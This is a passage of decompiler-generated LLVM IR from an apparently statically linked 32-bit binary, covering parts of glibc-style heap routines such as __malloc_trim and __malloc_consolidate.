  %v2_80506a6 = add i32 %v0_80506a6, 4
  %v3_80506a6 = add i32 %v2_80506a6, %v1_80506a6
  %v4_80506a6 = inttoptr i32 %v3_80506a6 to i32*
  %v5_80506a6 = load i32, i32* %v4_80506a6, align 4
  %v6_80506a6 = or i32 %v5_80506a6, 1
  store i32 %v6_80506a6, i32* %v4_80506a6, align 4
  br label %dec_label_pc_80506dd

dec_label_pc_80506ad:                             ; preds = %dec_label_pc_8050690
  %v0_80506b1 = load i32, i32* @edi, align 4
  %v2_80506b1 = add i32 %v0_80506b1, %stack_var_-40.0
  store i32 %v2_80506b1, i32* %eax.global-to-local, align 4
  %v1_80506b4 = add i32 %v0_80506b1, 4
  %v2_80506b4 = inttoptr i32 %v1_80506b4 to i32*
  %v3_80506b4 = load i32, i32* %v2_80506b4, align 4
  %v1_80506b7 = urem i32 %v3_80506b4, 2
  %v5_80506ba = or i32 %v1_80506b7, %stack_var_-40.0
  store i32 %v5_80506ba, i32* %v2_80506b4, align 4
  %v0_80506c4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80506c6 = or i32 %v0_80506c4, 1
  store i32 %v1_80506c6, i32* @edx, align 4
  %v1_80506c9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80506c9 = add i32 %v1_80506c9, 4
  %v3_80506c9 = inttoptr i32 %v2_80506c9 to i32*
  store i32 %v1_80506c6, i32* %v3_80506c9, align 4
  %v0_80506cc = load i32, i32* %eax.global-to-local, align 4
  %v1_80506cc = load i32, i32* %ecx.global-to-local, align 4
  %v2_80506cc = add i32 %v0_80506cc, 4
  %v3_80506cc = add i32 %v2_80506cc, %v1_80506cc
  %v4_80506cc = inttoptr i32 %v3_80506cc to i32*
  %v5_80506cc = load i32, i32* %v4_80506cc, align 4
  %v6_80506cc = or i32 %v5_80506cc, 1
  store i32 %v6_80506cc, i32* %v4_80506cc, align 4
  %v0_80506d1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80506d1 = add i32 %v0_80506d1, 8
  store i32 %v1_80506d1, i32* %eax.global-to-local, align 4
  store i32 %v1_80506d1, i32* %stack_var_-60, align 4
  %v1_80506d5 = call i32 @free(i32 %v1_80506d1)
  store i32 %v1_80506d5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506dd

dec_label_pc_80506dd:                             ; preds = %dec_label_pc_805069b, %dec_label_pc_80506ad
  %v0_80506dd = load i32, i32* @edi, align 4
  %v1_80506dd = add i32 %v0_80506dd, 8
  store i32 %v1_80506dd, i32* @ebx, align 4
  br label %dec_label_pc_80507b9

dec_label_pc_80506e5:                             ; preds = %dec_label_pc_8050535
  store i32 %tmp7, i32* %ecx.global-to-local, align 4
  %v0_80506e9 = load i32, i32* @global_var_806017c.231, align 4
  %v1_80506ee = add i32 %v0_80506e9, -1
  store i32 %v1_80506ee, i32* %eax.global-to-local, align 4
  %v2_80506f3 = inttoptr i32 %v1_8050539 to i32*
  %v3_80506f3 = load i32, i32* %v2_80506f3, align 4
  store i32 %v3_80506f3, i32* @ebp, align 4
  %v1_80506f6 = or i32 %stack_var_-40.0, 4
  store i32 %v1_80506f6, i32* %stack_var_-44, align 4
  %v2_80506fc = add i32 %v3_80506f3, %v1_80506ee
  store i32 %v2_80506fc, i32* @edx, align 4
  %v1_80506ff = sub i32 0, %v0_80506e9
  store i32 %v1_80506ff, i32* %eax.global-to-local, align 4
  %v2_8050701 = add i32 %v2_80506fc, %v1_80506f6
  %v2_8050704 = and i32 %v2_8050701, %v1_80506ff
  store i32 %v2_8050704, i32* @esi, align 4
  %v2_8050708 = sub i32 %v2_8050704, %v3_80506f3
  store i32 %v2_8050708, i32* @ebx, align 4
  %v15_805070a = icmp eq i32 %v1_8050541, %v2_8050708
  br i1 %v15_805070a, label %dec_label_pc_80507b5, label %dec_label_pc_8050714

dec_label_pc_8050714:                             ; preds = %dec_label_pc_80506e5
  %v2_805071b = sub i32 %v1_8050539, %v3_80506f3
  store i32 %v2_805071b, i32* @edi, align 4
  %v2_805071d = add i32 %v3_80506f3, %v1_8050541
  store i32 %v2_805071d, i32* %eax.global-to-local, align 4
  store i32 %v2_805071b, i32* %stack_var_-60, align 4
  %v6_8050721 = call i32 @mremap(i32 %v2_805071b, i32 %v2_805071d, i32 %v2_8050704, i32 1, i32 %v1_80506f6, i32 %v1_8050541)
  store i32 %v6_8050721, i32* %eax.global-to-local, align 4
  %v10_8050729 = icmp eq i32 %v6_8050721, -1
  br i1 %v10_8050729, label %dec_label_pc_805076d, label %dec_label_pc_805072e

dec_label_pc_805072e:                             ; preds = %dec_label_pc_8050714
  %v1_805072e = load i32, i32* @ebp, align 4
  %v2_805072e = add i32 %v1_805072e, %v6_8050721
  store i32 %v2_805072e, i32* @edx, align 4
  %v0_8050731 = load i32, i32* @ebx, align 4
  %v1_8050731 = or i32 %v0_8050731, 2
  store i32 %v1_8050731, i32* %ebx.global-to-local, align 4
  %v0_8050734 = load i32, i32* @esi, align 4
  store i32 %v0_8050734, i32* %eax.global-to-local, align 4
  %v2_8050736 = add i32 %v2_805072e, 4
  %v3_8050736 = inttoptr i32 %v2_8050736 to i32*
  store i32 %v1_8050731, i32* %v3_8050736, align 4
  %v0_8050739 = load i32, i32* %eax.global-to-local, align 4
  %v5_8050739 = sub i32 %v0_8050739, %v1_8050541
  %v1_805073d = load i32, i32* @global_var_8060184.236, align 4
  %v2_805073d = add i32 %v1_805073d, %v5_8050739
  store i32 %v2_805073d, i32* %eax.global-to-local, align 4
  store i32 %v2_805073d, i32* @global_var_8060184.236, align 4
  %v1_8050748 = load i32, i32* @global_var_8060190.237, align 16
  %tmp25 = icmp ugt i32 %v2_805073d, %v1_8050748
  br i1 %tmp25, label %dec_label_pc_8050750, label %dec_label_pc_8050755

dec_label_pc_8050750:                             ; preds = %dec_label_pc_805072e
  store i32 %v2_805073d, i32* @global_var_8060190.237, align 16
  br label %dec_label_pc_8050755

dec_label_pc_8050755:                             ; preds = %dec_label_pc_805072e, %dec_label_pc_8050750
  %v1_8050755 = load i32, i32* @global_var_8060188.238, align 8
  %v2_8050755 = add i32 %v1_8050755, %v2_805073d
  store i32 %v2_8050755, i32* %eax.global-to-local, align 4
  %v1_805075b = load i32, i32* @global_var_8060194.239, align 4
  %tmp26 = icmp ugt i32 %v2_8050755, %v1_805075b
  br i1 %tmp26, label %dec_label_pc_8050763, label %dec_label_pc_8050768

dec_label_pc_8050763:                             ; preds = %dec_label_pc_8050755
  store i32 %v2_8050755, i32* @global_var_8060194.239, align 4
  br label %dec_label_pc_8050768

dec_label_pc_8050768:                             ; preds = %dec_label_pc_8050755, %dec_label_pc_8050763
  %v0_8050768 = load i32, i32* @edx, align 4
  %v1_8050768 = add i32 %v0_8050768, 8
  store i32 %v1_8050768, i32* @ebx, align 4
  br label %dec_label_pc_80507b9

dec_label_pc_805076d:                             ; preds = %dec_label_pc_8050714
  %v2_805076d = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_805076d, i32* %eax.global-to-local, align 4
  %v10_8050770 = icmp ult i32 %v1_8050541, %v2_805076d
  %v1_8050774 = icmp eq i1 %v10_8050770, false
  br i1 %v1_8050774, label %dec_label_pc_80507b5, label %dec_label_pc_8050776

dec_label_pc_8050776:                             ; preds = %dec_label_pc_805076d
  %v1_805077d = add i32 %stack_var_-40.0, -7
  store i32 %v1_805077d, i32* %eax.global-to-local, align 4
  store i32 %v1_805077d, i32* %stack_var_-60, align 4
  %v1_8050781 = call i32 @malloc(i32 %v1_805077d)
  store i32 %v1_8050781, i32* %eax.global-to-local, align 4
  store i32 %v1_8050781, i32* @ebx, align 4
  %v1_805078b = icmp eq i32 %v1_8050781, 0
  br i1 %v1_805078b, label %dec_label_pc_80507b1, label %dec_label_pc_805078f

dec_label_pc_805078f:                             ; preds = %dec_label_pc_8050776
  %v1_8050794 = add i32 %v1_8050541, -8
  store i32 %v1_8050794, i32* %eax.global-to-local, align 4
  store i32 %v1_8050781, i32* %stack_var_-60, align 4
  %v3_805079d = inttoptr i32 %v1_8050781 to i16*
  %v4_805079d = call i32 @memcpy(i16* %v3_805079d, i32 %tmp7, i32 %v1_8050794)
  store i32 %v4_805079d, i32* %eax.global-to-local, align 4
  store i32 %v1_8050781, i32* @edx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80507a7 = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_80507ac

dec_label_pc_80507ac:                             ; preds = %dec_label_pc_805067c, %dec_label_pc_805078f
  %storemerge = phi i32 [ %v1_80507a7, %dec_label_pc_805078f ], [ %v1_8050686, %dec_label_pc_805067c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80507b9

dec_label_pc_80507b1:                             ; preds = %dec_label_pc_8050776, %dec_label_pc_80505e0
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80507b9

dec_label_pc_80507b5:                             ; preds = %dec_label_pc_805076d, %dec_label_pc_80506e5, %dec_label_pc_805057f
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_80507b9

dec_label_pc_80507b9:                             ; preds = %dec_label_pc_80507b1, %dec_label_pc_80507ac, %dec_label_pc_8050768, %dec_label_pc_80506dd, %dec_label_pc_80507b5
  store i32 %v2_80504ee, i32* @eax, align 4
  store i32 %v2_80504ee, i32* %stack_var_-60, align 4
  %v2_80507c2 = call i32 @__pthread_return_void(i32 %v2_80504ee, i32 1)
  store i32 %v2_80507c2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80507c7

dec_label_pc_80507c7:                             ; preds = %dec_label_pc_80504d2, %dec_label_pc_80504be, %dec_label_pc_80507b9
  br label %dec_label_pc_80507ca

dec_label_pc_80507ca:                             ; preds = %dec_label_pc_805050c, %dec_label_pc_80507c7
  %v0_80507cd = load i32, i32* @ebx, align 4
  store i32 %v0_80507cd, i32* %eax.global-to-local, align 4
  store i32 %v0_80504af, i32* %ebx.global-to-local, align 4
  store i32 %v0_80504ae, i32* @esi, align 4
  ret i32 %v0_80507cd

; uselistorder directives
  uselistorder i32 %v1_8050781, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8050755, { 1, 0, 2 }
  uselistorder i32 %v2_805073d, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_805071b, { 1, 0, 2 }
  uselistorder i32 %v1_80506f6, { 1, 0, 2 }
  uselistorder i32 %v3_80506f3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_80506b1, { 1, 0 }
  uselistorder i32 %v1_8050617, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_80505eb, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_805058f, { 1, 0, 2 }
  uselistorder i32 %v3_80505a2, { 0, 2, 1 }
  uselistorder i32 %v2_805055f, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8050541, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8050539, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_805052e, { 1, 0 }
  uselistorder i32 %v1_805051e, { 0, 2, 1 }
  uselistorder i32 %v0_8050507, { 1, 0 }
  uselistorder i32 %v2_80504ee, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 50, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 38, 41, 42, 43, 44, 0, 45, 46, 47, 48, 49 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_80507ca, { 1, 0 }
  uselistorder label %dec_label_pc_80507c7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80507b9, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80507ac, { 1, 0 }
  uselistorder label %dec_label_pc_8050768, { 1, 0 }
  uselistorder label %dec_label_pc_8050755, { 1, 0 }
  uselistorder label %dec_label_pc_80506dd, { 1, 0 }
  uselistorder label %dec_label_pc_8050690, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805067c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80505d5, { 1, 0 }
  uselistorder label %dec_label_pc_8050535, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_80507db = load i32, i32* @edx, align 4
  store i32 %v0_80507db, i32* %ebp.global-to-local, align 4
  %v1_80507dd = add i32 %v0_80507db, 860
  %v2_80507dd = inttoptr i32 %v1_80507dd to i32*
  %v3_80507dd = load i32, i32* %v2_80507dd, align 4
  store i32 %v3_80507dd, i32* @ecx, align 4
  %v1_80507e3 = add i32 %v0_80507db, 44
  %v2_80507e3 = inttoptr i32 %v1_80507e3 to i32*
  %v3_80507e3 = load i32, i32* %v2_80507e3, align 4
  %v1_80507e6 = add i32 %v3_80507e3, 4
  %v2_80507e6 = inttoptr i32 %v1_80507e6 to i32*
  %v3_80507e6 = load i32, i32* %v2_80507e6, align 4
  %v1_80507e9 = and i32 %v3_80507e6, -4
  store i32 %v1_80507e9, i32* @esi, align 4
  %v1_80507ee = load i32, i32* @eax, align 4
  %v2_80507ee = add i32 %v3_80507dd, -17
  %v2_80507f0 = add i32 %v2_80507ee, %v1_80507e9
  %v3_80507f0 = sub i32 %v2_80507f0, %v1_80507ee
  %div = udiv i32 %v3_80507f0, %v3_80507dd
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_80507f0, %v3_80507dd
  store i32 %tmp10, i32* @edx, align 4
  %v1_80507f8 = add i32 %div, -1
  %v4_80507fb = mul i32 %v1_80507f8, %v3_80507dd
  store i32 %v4_80507fb, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_80507fb, 1
  br i1 %tmp11, label %dec_label_pc_8050857, label %dec_label_pc_8050802

dec_label_pc_8050802:                             ; preds = %entry
  %v1_8050807 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050807, i32* %edi.global-to-local, align 4
  %v0_805080e = load i32, i32* @esi, align 4
  store i32 %v0_805080e, i32* %eax.global-to-local, align 4
  %v1_8050810 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050810 = add i32 %v1_8050810, 44
  %v3_8050810 = inttoptr i32 %v2_8050810 to i32*
  %v4_8050810 = load i32, i32* %v3_8050810, align 4
  %v5_8050810 = add i32 %v4_8050810, %v0_805080e
  store i32 %v5_8050810, i32* %eax.global-to-local, align 4
  %v12_8050816 = icmp eq i32 %v1_8050807, %v5_8050810
  %v1_8050818 = icmp eq i1 %v12_8050816, false
  br i1 %v1_8050818, label %dec_label_pc_8050857, label %dec_label_pc_805081a

dec_label_pc_805081a:                             ; preds = %dec_label_pc_8050802
  %v1_805081d = sub i32 0, %v4_80507fb
  store i32 %v1_805081d, i32* @ebx, align 4
  %v1_8050820 = call i32 @__GI_sbrk(i32 %v1_805081d)
  store i32 %v1_8050820, i32* %eax.global-to-local, align 4
  %v1_805082c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805082c, i32* %eax.global-to-local, align 4
  %v10_8050834 = icmp eq i32 %v1_805082c, -1
  br i1 %v10_8050834, label %dec_label_pc_8050857, label %dec_label_pc_8050839

dec_label_pc_8050839:                             ; preds = %dec_label_pc_805081a
  %v0_8050839 = load i32, i32* %edi.global-to-local, align 4
  %v2_805083b = sub i32 %v0_8050839, %v1_805082c
  %v12_805083b = icmp eq i32 %v2_805083b, 0
  store i32 %v2_805083b, i32* @ecx, align 4
  br i1 %v12_805083b, label %dec_label_pc_8050857, label %dec_label_pc_805083f

dec_label_pc_805083f:                             ; preds = %dec_label_pc_8050839
  %v0_805083f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805083f = add i32 %v0_805083f, 44
  %v2_805083f = inttoptr i32 %v1_805083f to i32*
  %v3_805083f = load i32, i32* %v2_805083f, align 4
  store i32 %v3_805083f, i32* %eax.global-to-local, align 4
  %v1_8050842 = add i32 %v0_805083f, 872
  %v2_8050842 = inttoptr i32 %v1_8050842 to i32*
  %v3_8050842 = load i32, i32* %v2_8050842, align 4
  %v5_8050842 = sub i32 %v3_8050842, %v2_805083b
  store i32 %v5_8050842, i32* %v2_8050842, align 4
  %v0_8050848 = load i32, i32* @esi, align 4
  %v1_8050848 = load i32, i32* @ecx, align 4
  %v2_8050848 = sub i32 %v0_8050848, %v1_8050848
  %v1_805084a = or i32 %v2_8050848, 1
  %v1_805084d = load i32, i32* %eax.global-to-local, align 4
  %v2_805084d = add i32 %v1_805084d, 4
  %v3_805084d = inttoptr i32 %v2_805084d to i32*
  store i32 %v1_805084a, i32* %v3_805084d, align 4
  br label %dec_label_pc_8050859

dec_label_pc_8050857:                             ; preds = %dec_label_pc_8050839, %dec_label_pc_805081a, %dec_label_pc_8050802, %entry
  br label %dec_label_pc_8050859

dec_label_pc_8050859:                             ; preds = %dec_label_pc_805083f, %dec_label_pc_8050857
  %storemerge = phi i32 [ 1, %dec_label_pc_805083f ], [ 0, %dec_label_pc_8050857 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805082c, { 1, 0, 2 }
  uselistorder i32 %v4_80507fb, { 1, 2, 0 }
  uselistorder i32 %v3_80507dd, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050859, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_8050862 = load i32, i32* @edi, align 4
  %v0_8050863 = load i32, i32* @esi, align 4
  %v0_8050864 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_805086c = load i32, i32* %arg1, align 4
  store i32 %v2_805086c, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8050873 = icmp eq i32 %v2_805086c, 0
  br i1 %v1_8050873, label %dec_label_pc_805099c.preheader, label %dec_label_pc_805087b

dec_label_pc_805099c.preheader:                   ; preds = %entry
  %v3_8050991 = add i32 %tmp11, 44
  br label %dec_label_pc_805098d

dec_label_pc_805087b:                             ; preds = %entry
  %v1_805087f = and i32 %v2_805086c, -3
  store i32 %v1_805087f, i32* %arg1, align 4
  %v1_8050884 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_805088f = add i32 %tmp11, 4
  store i32 %v1_805088f, i32* %eax.global-to-local, align 4
  %v2_805089a = load i32, i32* %arg1, align 4
  %v2_80508a0 = udiv i32 %v2_805089a, 8
  %v2_80508a3 = mul nuw i32 %v2_80508a0, 4
  %v3_80508a3 = add i32 %tmp11, -4
  %v4_80508a3 = add i32 %v3_80508a3, %v2_80508a3
  store i32 %v4_80508a3, i32* %eax.global-to-local, align 4
  %v2_805096a = add i32 %tmp11, 44
  %v3_805096a = inttoptr i32 %v2_805096a to i32*
  %v1_805093d = add i32 %tmp11, 60
  %v2_805093d = inttoptr i32 %v1_805093d to i32*
  br label %dec_label_pc_80508ab

dec_label_pc_80508ab:                             ; preds = %dec_label_pc_8050983, %dec_label_pc_805087b
  %v0_80508b9 = phi i32 [ %v1_805088f, %dec_label_pc_805087b ], [ %v4_8050983, %dec_label_pc_8050983 ]
  store i32 %v0_80508b9, i32* %eax.global-to-local, align 4
  %v1_80508af = inttoptr i32 %v0_80508b9 to i32*
  %v2_80508af = load i32, i32* %v1_80508af, align 4
  store i32 %v2_80508af, i32* @ecx, align 4
  %v1_80508b1 = icmp eq i32 %v2_80508af, 0
  br i1 %v1_80508b1, label %dec_label_pc_8050979, label %dec_label_pc_80508b9

dec_label_pc_80508b9:                             ; preds = %dec_label_pc_80508ab
  store i32 0, i32* %v1_80508af, align 4
  %v0_80508bf.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80508bf

dec_label_pc_80508bf:                             ; preds = %dec_label_pc_805096d, %dec_label_pc_80508b9
  %v0_80508dc = phi i32 [ %v3_80508bf, %dec_label_pc_805096d ], [ %v0_80508bf.pre, %dec_label_pc_80508b9 ]
  %v1_80508bf = add i32 %v0_80508dc, 8
  %v2_80508bf = inttoptr i32 %v1_80508bf to i32*
  %v3_80508bf = load i32, i32* %v2_80508bf, align 4
  store i32 %v3_80508bf, i32* %edx.global-to-local, align 4
  %v1_80508c6 = add i32 %v0_80508dc, 4
  %v2_80508c6 = inttoptr i32 %v1_80508c6 to i32*
  %v3_80508c6 = load i32, i32* %v2_80508c6, align 4
  store i32 %v3_80508c6, i32* %eax.global-to-local, align 4
  %v1_80508cb = and i32 %v3_80508c6, -2
  store i32 %v1_80508cb, i32* @edi, align 4
  %v2_80508ce = urem i32 %v3_80508c6, 2
  %v3_80508ce = icmp eq i32 %v2_80508ce, 0
  %v2_80508d0 = add i32 %v1_80508cb, %v0_80508dc
  store i32 %v2_80508d0, i32* @ebx, align 4
  %v1_80508d3 = add i32 %v2_80508d0, 4
  %v2_80508d3 = inttoptr i32 %v1_80508d3 to i32*
  %v3_80508d3 = load i32, i32* %v2_80508d3, align 4
  store i32 %v3_80508d3, i32* %edx.global-to-local, align 4
  %v1_80508da = icmp eq i1 %v3_80508ce, false
  br i1 %v1_80508da, label %dec_label_pc_80508fc, label %dec_label_pc_80508dc

dec_label_pc_80508dc:                             ; preds = %dec_label_pc_80508bf
  %v1_80508dc = inttoptr i32 %v0_80508dc to i32*
  %v2_80508dc = load i32, i32* %v1_80508dc, align 4
  store i32 %v2_80508dc, i32* %ebp.global-to-local, align 4
  %v2_80508e0 = sub i32 %v0_80508dc, %v2_80508dc
  store i32 %v2_80508e0, i32* %eax.global-to-local, align 4
  %v1_80508e2 = add i32 %v2_80508e0, 8
  %v2_80508e2 = inttoptr i32 %v1_80508e2 to i32*
  %v3_80508e2 = load i32, i32* %v2_80508e2, align 4
  store i32 %v3_80508e2, i32* @esi, align 4
  %v1_80508e5 = add i32 %v2_80508e0, 12
  %v2_80508e5 = inttoptr i32 %v1_80508e5 to i32*
  %v3_80508e5 = load i32, i32* %v2_80508e5, align 4
  store i32 %v3_80508e5, i32* %edx.global-to-local, align 4
  %v1_80508e8 = add i32 %v3_80508e2, 12
  %v2_80508e8 = inttoptr i32 %v1_80508e8 to i32*
  %v3_80508e8 = load i32, i32* %v2_80508e8, align 4
  store i32 %v3_80508e8, i32* @ecx, align 4
  %v12_80508eb = icmp eq i32 %v3_80508e8, %v2_80508e0
  %v1_80508ed = icmp eq i1 %v12_80508eb, false
  br i1 %v1_80508ed, label %dec_label_pc_805092c, label %dec_label_pc_80508ef

dec_label_pc_80508ef:                             ; preds = %dec_label_pc_80508dc
  %v1_80508ef = add i32 %v3_80508e5, 8
  %v2_80508ef = inttoptr i32 %v1_80508ef to i32*
  %v3_80508ef = load i32, i32* %v2_80508ef, align 4
  %v15_80508ef = icmp eq i32 %v3_80508ef, %v3_80508e8
  %v1_80508f2 = icmp eq i1 %v15_80508ef, false
  br i1 %v1_80508f2, label %dec_label_pc_805092c, label %dec_label_pc_80508f4

dec_label_pc_80508f4:                             ; preds = %dec_label_pc_80508ef
  %v2_80508f4 = add i32 %v2_80508dc, %v1_80508cb
  store i32 %v2_80508f4, i32* @edi, align 4
  store i32 %v3_80508e5, i32* %v2_80508e8, align 4
  %v0_80508f9 = load i32, i32* @esi, align 4
  %v1_80508f9 = load i32, i32* %edx.global-to-local, align 4
  %v2_80508f9 = add i32 %v1_80508f9, 8
  %v3_80508f9 = inttoptr i32 %v2_80508f9 to i32*
  store i32 %v0_80508f9, i32* %v3_80508f9, align 4
  %v0_8050907.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80508fc

dec_label_pc_80508fc:                             ; preds = %dec_label_pc_80508bf, %dec_label_pc_80508f4
  %v1_8050910 = phi i32 [ %v2_80508d0, %dec_label_pc_80508bf ], [ %v0_8050907.pre, %dec_label_pc_80508f4 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8050904 = and i32 %v3_80508d3, -4
  store i32 %v1_8050904, i32* %ebp.global-to-local, align 4
  %v4_8050907 = load i32, i32* %v3_805096a, align 4
  %v15_8050907 = icmp eq i32 %v1_8050910, %v4_8050907
  br i1 %v15_8050907, label %dec_label_pc_805095d, label %dec_label_pc_805090c

dec_label_pc_805090c:                             ; preds = %dec_label_pc_80508fc
  %v2_805090c = add i32 %v1_8050910, 4
  %v3_805090c = add i32 %v2_805090c, %v1_8050904
  %v4_805090c = inttoptr i32 %v3_805090c to i32*
  %v5_805090c = load i32, i32* %v4_805090c, align 4
  store i32 %v5_805090c, i32* %eax.global-to-local, align 4
  %v3_8050910 = inttoptr i32 %v2_805090c to i32*
  store i32 %v1_8050904, i32* %v3_8050910, align 4
  %v0_8050913 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050913 = urem i32 %v0_8050913, 2
  %v2_8050913 = icmp eq i32 %v1_8050913, 0
  store i32 %v1_8050913, i32* %eax.global-to-local, align 4
  %v1_8050918 = icmp eq i1 %v2_8050913, false
  br i1 %v1_8050918, label %dec_label_pc_8050939, label %dec_label_pc_805091a

dec_label_pc_805091a:                             ; preds = %dec_label_pc_805090c
  %v0_805091a = load i32, i32* @ebx, align 4
  %v1_805091a = add i32 %v0_805091a, 8
  %v2_805091a = inttoptr i32 %v1_805091a to i32*
  %v3_805091a = load i32, i32* %v2_805091a, align 4
  store i32 %v3_805091a, i32* @edx, align 4
  %v1_805091d = add i32 %v0_805091a, 12
  %v2_805091d = inttoptr i32 %v1_805091d to i32*
  %v3_805091d = load i32, i32* %v2_805091d, align 4
  store i32 %v3_805091d, i32* %eax.global-to-local, align 4
  %v1_8050920 = add i32 %v3_805091a, 12
  %v2_8050920 = inttoptr i32 %v1_8050920 to i32*
  %v3_8050920 = load i32, i32* %v2_8050920, align 4
  store i32 %v3_8050920, i32* @esi, align 4
  %v12_8050923 = icmp eq i32 %v3_8050920, %v0_805091a
  %v1_8050925 = icmp eq i1 %v12_8050923, false
  br i1 %v1_8050925, label %dec_label_pc_805092c, label %dec_label_pc_8050927

dec_label_pc_8050927:                             ; preds = %dec_label_pc_805091a
  %v1_8050927 = add i32 %v3_805091d, 8
  %v2_8050927 = inttoptr i32 %v1_8050927 to i32*
  %v3_8050927 = load i32, i32* %v2_8050927, align 4
  %v15_8050927 = icmp eq i32 %v3_8050927, %v3_8050920
  br i1 %v15_8050927, label %dec_label_pc_8050931, label %dec_label_pc_805092c

dec_label_pc_805092c:                             ; preds = %dec_label_pc_8050927, %dec_label_pc_805091a, %dec_label_pc_80508ef, %dec_label_pc_80508dc
  %v0_805092c = call i32 @abort()
  store i32 %v0_805092c, i32* %eax.global-to-local, align 4
  %v1_8050933.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050931

dec_label_pc_8050931:                             ; preds = %dec_label_pc_8050927, %dec_label_pc_805092c
  %v1_8050933 = phi i32 [ %v3_805091a, %dec_label_pc_8050927 ], [ %v1_8050933.pre, %dec_label_pc_805092c ]
  %v0_8050933 = phi i32 [ %v3_805091d, %dec_label_pc_8050927 ], [ %v0_805092c, %dec_label_pc_805092c ]
  %v0_8050931 = load i32, i32* @edi, align 4
  %v1_8050931 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050931 = add i32 %v1_8050931, %v0_8050931
  store i32 %v2_8050931, i32* @edi, align 4
  %v2_8050933 = add i32 %v1_8050933, 12
  %v3_8050933 = inttoptr i32 %v2_8050933 to i32*
  store i32 %v0_8050933, i32* %v3_8050933, align 4
  %v0_8050936 = load i32, i32* @edx, align 4
  %v1_8050936 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050936 = add i32 %v1_8050936, 8
  %v3_8050936 = inttoptr i32 %v2_8050936 to i32*
  store i32 %v0_8050936, i32* %v3_8050936, align 4
  br label %dec_label_pc_8050939

dec_label_pc_8050939:                             ; preds = %dec_label_pc_805090c, %dec_label_pc_8050931
  store i32 %v1_8050884, i32* %eax.global-to-local, align 4
  %v3_805093d = load i32, i32* %v2_805093d, align 4
  store i32 %v3_805093d, i32* @edx, align 4
  %v0_8050940 = load i32, i32* @ecx, align 4
  store i32 %v0_8050940, i32* %v2_805093d, align 4
  %v0_8050943 = load i32, i32* @edi, align 4
  %v1_8050945 = or i32 %v0_8050943, 1
  store i32 %v1_8050945, i32* %eax.global-to-local, align 4
  %v0_8050948 = load i32, i32* @ecx, align 4
  %v1_8050948 = load i32, i32* @edx, align 4
  %v2_8050948 = add i32 %v1_8050948, 12
  %v3_8050948 = inttoptr i32 %v2_8050948 to i32*
  store i32 %v0_8050948, i32* %v3_8050948, align 4
  %v0_805094b = load i32, i32* %eax.global-to-local, align 4
  %v1_805094b = load i32, i32* @ecx, align 4
  %v2_805094b = add i32 %v1_805094b, 4
  %v3_805094b = inttoptr i32 %v2_805094b to i32*
